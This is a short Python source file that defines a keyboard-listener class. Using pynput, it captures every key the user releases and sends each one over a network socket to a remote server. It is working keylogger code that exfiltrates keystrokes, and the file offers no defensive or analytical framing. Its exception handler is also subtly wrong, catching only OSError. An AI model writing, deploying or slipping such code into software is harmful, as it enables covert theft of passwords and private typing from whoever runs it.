import time
from pynput.keyboard import Listener


class listener_keyboard:

    def __init__(self, send_socket):
        self.send_socket = send_socket

    def on_release(self, key):
        try:
            self.send_socket.send(format(key).encode())
        except OSError or ConnectionResetError:  # in case server hangs up before client realises
            return False  # end listener

    def listen_and_send(self):
        with Listener(on_release=self.on_release) as listener:
            time.sleep(10)
            listener.join()